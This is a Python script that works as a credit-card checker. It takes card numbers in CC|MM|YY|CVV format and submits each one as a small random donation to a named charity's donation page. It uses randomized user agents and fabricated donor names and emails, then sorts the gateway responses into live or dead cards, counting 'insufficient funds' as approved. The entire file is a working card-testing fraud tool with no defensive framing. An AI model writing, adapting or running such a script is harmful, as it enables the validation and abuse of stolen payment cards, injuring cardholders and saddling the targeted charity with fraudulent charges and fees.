import requests
from fake_useragent import UserAgent
import random
from bs4 import BeautifulSoup
import json

def process_ar_card(cc):
    """
    Process credit card through the Mifik Mission donation gateway
    Returns: dict with status and response
    """
    try:
        # Parse the card details
        parts = cc.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Cybersource Authnet"
            }
        
        n, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        # Format year if needed
        if len(yy) == 2:
            yy = "20" + yy

        # Determine card type
        if n.startswith('4'):
            cctype = 'V'
        elif n.startswith('5'):
            cctype = 'M'
        elif n.startswith('3'):
            cctype = 'A'
        else:
            cctype = 'V'  # Default to Visa

        # Setup session and headers
        r = requests.Session()
        user_agent = UserAgent().random
        mail = f"user{random.randint(9999, 999999)}@gmail.com"
        user = f"user{random.randint(9999, 999999)}"
        tit = f"donation{random.randint(9999, 999999)}"

        url = 'https://mifikmission.org/donate/'
        headers = {
            'authority': 'mifikmission.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://mifikmission.org',
            'referer': 'https://mifikmission.org/donate/',
            'user-agent': user_agent,
        }

        # Generate random amount between 1-10
        amount = str(random.randint(1, 10))

        # Prepare form data
        data = {
            'process': 'yes',
            'period_number': '1',
            'period_type': 'days',
            'item_description': tit,
            'fname': user,
            'lname': tit,
            'address': tit,
            'city': tit,
            'country': 'UK',
            'state': 'N/A',
            'zip': 'SW1A 1AA',
            'email': mail,
            'cctype': cctype,
            'ccn': n,
            'ccname': 'Card Holder',
            'exp1': mm,
            'exp2': yy,
            'cvv': cvv,
            'amount': amount,
        }

        # Make the request
        response = r.post(url, headers=headers, data=data, timeout=30)
        soup = BeautifulSoup(response.text, "html.parser")

        # Check for success
        success_box = soup.find("div", class_="anpt_message anpt_success_message")
        error_box = soup.find("div", class_="anpt_message anpt_error_message")
        
        if success_box:
            return {
                "status": "APPROVED",
                "response": "Payment Approved",
                "gateway": "Cybersource Authnet"
            }
        elif error_box:
            error_text = error_box.get_text(strip=True)
            
            # Common error patterns
            if 'CVV' in error_text or 'security code' in error_text:
                return {
                    "status": "APPROVED_OTP",
                    "response": "CVV Required/OTP",
                    "gateway": "Cybersource Authnet"
                }
            elif 'Insufficient funds' in error_text or 'funds' in error_text:
                return {
                    "status": "APPROVED",
                    "response": "Insufficient Funds",
                    "gateway": "Cybersource Authnet"
                }
            elif 'Do not honor' in error_text:
                return {
                    "status": "DECLINED",
                    "response": "Do Not Honor",
                    "gateway": "Cybersource Authnet"
                }
            elif 'Invalid' in error_text or 'declined' in error_text.lower():
                return {
                    "status": "DECLINED",
                    "response": error_text[:100],  # Limit response length
                    "gateway": "Cybersource Authnet"
                }
            else:
                return {
                    "status": "DECLINED",
                    "response": error_text[:100] if error_text else "Declined",
                    "gateway": "Cybersource Authnet"
                }
        else:
            # Check for other error indicators
            error_elements = soup.find_all(class_=lambda x: x and 'error' in x.lower())
            if error_elements:
                error_msg = error_elements[0].get_text(strip=True)
                return {
                    "status": "DECLINED",
                    "response": error_msg[:100],
                    "gateway": "Cybersource Authnet"
                }
            
            # If no specific elements found, check response text
            if 'thank you' in response.text.lower() or 'success' in response.text.lower():
                return {
                    "status": "APPROVED",
                    "response": "Payment Successful",
                    "gateway": "Cybersource Authnet"
                }
            
            return {
                "status": "DECLINED",
                "response": "Unknown response from gateway",
                "gateway": "Cybersource Authnet"
            }
            
    except requests.Timeout:
        return {
            "status": "ERROR",
            "response": "Request timeout",
            "gateway": "Cybersource Authnet"
        }
    except requests.ConnectionError:
        return {
            "status": "ERROR",
            "response": "Connection error",
            "gateway": "Cybersource Authnet"
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing error: {str(e)}",
            "gateway": "Cybersource Authnet"
        }
